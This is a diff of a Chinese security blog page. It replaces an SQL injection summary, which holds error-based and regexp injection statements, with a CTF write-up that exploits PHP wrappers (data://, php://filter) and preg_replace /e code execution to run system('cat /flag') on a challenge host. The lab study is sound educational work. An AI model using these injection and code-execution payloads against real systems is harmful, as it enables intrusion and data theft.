@@ -14,12 +14,12 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="本篇 Blog 的内容更像是一页目录,主要记录在做题过程中所遇到的关于  Sqli 类型的题目
-以及对题目的类型进行的总结和分类,可点击 相关题目中的链接以查看题目的具体解答过程.">
+  <meta name="description" content="记一道简单的php代码审计题.
+​    ">
   <meta name="author" content="Noel">
   <meta name="keywords" content="">
   
-  <title>Sql Injection_summary - Noel&#39;s Blog</title>
+  <title>BJDCTF2020ZJCTF，不过如此 - Noel&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -164,7 +164,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Sql Injection_summary">
+            <span class="h2" id="subtitle" title="BJDCTF2020ZJCTF，不过如此">
               
             </span>
 
@@ -174,8 +174,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-07-18 04:23" pubdate>
-        2021年7月18日 凌晨
+      <time datetime="2021-07-24 04:34" pubdate>
+        2021年7月24日 凌晨
       </time>
     </span>
   
@@ -186,7 +186,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      395 字
+      604 字
     </span>
   
 
@@ -196,7 +196,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      8
        分钟
     </span>
   
@@ -234,40 +234,67 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Sql Injection_summary</h1>
+            <h1 style="display: none">BJDCTF2020ZJCTF，不过如此</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 天前
+                  本文最后更新于：7 分钟前
                 
               </p>
             
             <div class="markdown-body">
-              <p>本篇 Blog 的内容更像是一页目录,主要记录在做题过程中所遇到的关于  <code>Sqli</code> 类型的题目</p>
-<p>以及对题目的类型进行的总结和分类,可点击 <code>相关题目</code>中的链接以查看题目的具体解答过程.</p>
+              <p>记一道简单的php代码审计题.</p>
+<p>​    </p>
 <span id="more"></span>
 
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>打开题目链接直接看到源码</p>
+<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724051537700.png" srcset="/img/loading.gif" lazyload alt="image-20210724051537700"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
+<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><p>绕过第一个条件<code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;</code>的方法:</p>
+<ol>
+<li>php伪协议<code>data://</code></li>
+</ol>
+<p>构造payload如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="1-Bool-注入"><a href="#1-Bool-注入" class="headerlink" title="1. Bool 注入"></a>1. Bool 注入</h1><h2 id="1-1-逻辑注入"><a href="#1-1-逻辑注入" class="headerlink" title="1.1 逻辑注入"></a>1.1 逻辑注入</h2><h4 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h4><h2 id="1-2-正则注入"><a href="#1-2-正则注入" class="headerlink" title="1.2 正则注入"></a>1.2 正则注入</h2><h3 id="相关注意事项和总结"><a href="#相关注意事项和总结" class="headerlink" title="相关注意事项和总结"></a>相关注意事项和总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#与正则注入相关的关键字<br>regexp<br>like<br>binary<br><br># 常用语句<br>select * from tables where username regexp &quot;^&#123;&#125;&quot;;<br>select * from tables where username like &quot;&#123;&#125;%&quot;;	<br># 注意这两条语句没有 binary 关键字,所以是对大小写不敏感的<br><br># 如果要对大小写敏感 应加上 binary <br><br>select * from tables where username regexp binary &quot;^&#123;&#125;&quot;;<br>select * from tables where username like binary &quot;&#123;&#125;%&quot;;	<br></code></pre></td></tr></table></figure>
+<p>其中 <code>SSBoYXZlIGEgZHJlYW0=</code>为 “I have a dream” 的  <code>base64</code>编码</p>
+<ol start="2">
+<li>php为协议 <code>php://input</code></li>
+</ol>
+<p>构造payload如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="相关题目-1"><a href="#相关题目-1" class="headerlink" title="相关题目"></a>相关题目</h3><a href="/2021/07/18/NCTF2019SQLi/" title="NCTF2019SQLi">NCTF2019SQLi</a>
+<p>再使用hackbar传入<code>post</code>内容 <code>I have a dream</code></p>
+<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724052228758.png" srcset="/img/loading.gif" lazyload alt="image-20210724052228758"></p>
+<p>绕过<code>if</code>条件之后,根据提示,使用<code>php://filter</code>读取<code>next.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=next.php</span><br></code></pre></td></tr></table></figure>
 
+<p>完整padyload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></code></pre></td></tr></table></figure>
 
+<p>得到</p>
+<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724055034295.png" srcset="/img/loading.gif" lazyload alt="image-20210724055034295"></p>
+<p>解码一下,得到<code>next.php</code>的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
-<h2 id="1-3-无列名注入"><a href="#1-3-无列名注入" class="headerlink" title="1.3 无列名注入"></a>1.3 无列名注入</h2><h4 id="相关题目-2"><a href="#相关题目-2" class="headerlink" title="相关题目"></a>相关题目</h4><h1 id="2-二次注入"><a href="#2-二次注入" class="headerlink" title="2. 二次注入"></a>2. 二次注入</h1><h4 id="相关题目-3"><a href="#相关题目-3" class="headerlink" title="相关题目"></a>相关题目</h4><h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3. 报错注入"></a>3. 报错注入</h1><h3 id="必备知识"><a href="#必备知识" class="headerlink" title="必备知识"></a>必备知识</h3><ul>
-<li>Xpath 报错注入 (较为常用)</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mysql">/*  extractvalue() 介绍<br>extractvalue（XML_document，xpath_string) <br>作用: 对 XML 文档进行查询<br>其中<br>XML_document:	代表 xml 文档对象的名称<br>xpath_string:	xml路径<br><br># 常用构造语句<br>select * from table where id=1 || extractvalue(1,concat(0x7e,(select database()),0x7e))<br>*/<br><br><br>/* updatexml() 介绍<br>updatexml(XML_document,XPath_string,new_value)<br>作用: 更新 xml 文档<br>其中<br>XML_document:	代表 xml 文档对象的名称<br>XPath_string:	xml路径<br>new_value:		替换查找到的符合条件的数据,跟新的内容<br><br># 常用构造语句<br>select * from table where id=1 || updatexml(1,concat(0x7e,(select database()),0x7e),1)<br>*/<br></code></pre></td></tr></table></figure>
+<p>很简单的一个代码审计,漏洞函数为<code>preg_replace</code>的<code>/e</code>模式,和<code>Tinkphp2.x</code>一样的洞</p>
+<p>直接构造正则<code>.*=$&#123;phpinfo())</code>,发现不行,通过师傅们的博客了解到<code>.</code>在传入时被php解析成了<code>_</code></p>
+<p>大佬们的payload为:<code>\S*=$&#123;phpinfo()&#125;</code>,传入,能够打通.</p>
+<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724055802035.png" srcset="/img/loading.gif" lazyload alt="image-20210724055802035"></p>
+<p>直接构造payload调用<code>getFlag()</code>执行<code>eval函数</code></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//858ccbf7-57c7-4eee-9e0f-74366c2a1aea.node4.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;ls /&#x27;);</span><br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<p>以上两个函数需要 Mysql 版本&gt;5.1</p>
-</blockquote>
-<h3 id="相关题目-4"><a href="#相关题目-4" class="headerlink" title="相关题目"></a>相关题目</h3><a href="/2021/07/19/RCTF2015EasySQL/" title="RCTF2015EasySQL">RCTF2015EasySQL</a>
+<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724060110550.png" srcset="/img/loading.gif" lazyload alt="image-20210724060110550"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//858ccbf7-57c7-4eee-9e0f-74366c2a1aea.node4.buuoj.cn/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></code></pre></td></tr></table></figure>
 
-
-
-<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>
+<p><img src="/images/2021-07-24-BJDCTF2020ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20210724060132971.png" srcset="/img/loading.gif" lazyload alt="image-20210724060132971"></p>
+<p>拿到flag</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>算是一道比较简单的php代码审计题.本题利用较多的还是 <code>php伪协议</code>,从开始的<code>data://</code>绕过<code>if判断</code>,在到后面的<code>php://filter</code>读取文件源码.且此类型的题目的<code>php伪协议</code>利用手法较为常规,还不熟悉的师傅可以多看看.</p>
+<p>除此之外,另一个知识点就是关于<code>preg_replace</code>的代码执漏洞,这个漏洞函数比较常见,且影响范围也广,包括<code>Thinkphp2.x</code>,<code>phpMyadmin</code>以及一些cms.</p>
+<p>过后也会单独出一篇Blog来记录php代码审计中的常用函数</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/145646.htm">https://www.jb51.net/article/145646.htm</a>    </p>
 
             </div>
             <hr>
@@ -285,9 +312,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Sql-Injection-Summary/">Sql Injection Summary</a>
+                      <a class="hover-with-bg" href="/tags/php/">php</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%80%BB%E7%BB%93/">总结</a>
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                     
                   </div>
                 
@@ -304,18 +331,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/19/RCTF2015EasySQL/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">RCTF2015EasySQL</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/18/NCTF2019SQLi/">
-                        <span class="hidden-mobile">NCTF2019SQLi</span>
+                      <a href="/2021/07/23/GWCTF2019%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
+                        <span class="hidden-mobile">GWCTF2019我有一个数据库</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
